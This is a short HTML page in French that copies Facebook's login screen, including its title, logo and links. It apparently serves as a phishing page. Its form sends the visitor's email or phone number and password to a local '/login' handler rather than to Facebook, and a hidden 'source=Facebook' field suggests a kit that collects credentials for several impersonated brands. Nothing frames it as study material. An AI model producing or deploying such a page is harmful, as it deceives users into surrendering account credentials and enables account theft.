<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Facebook</title>
    <link rel="stylesheet" href="facebook_style.css">
</head>
<body>
    <div class="facebook-login-box">
        <img src="facebook_logo.png" alt="Facebook Logo" class="facebook-logo">
        <h2>Se connecter à Facebook</h2>
        
        <form id="facebookLoginForm" action="/login" method="POST">
            <input type="hidden" name="source" value="Facebook">
            <input type="text" name="username" placeholder="Adresse e-mail ou téléphone" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit" class="login-btn">Connexion</button>
        </form>
        
        
        <div class="options">
            <a href="#">Mot de passe oublié ?</a>
            <span class="separator">•</span>
            <a href="#">Créer un nouveau compte</a>
        </div>
    </div>
</body>
</html>
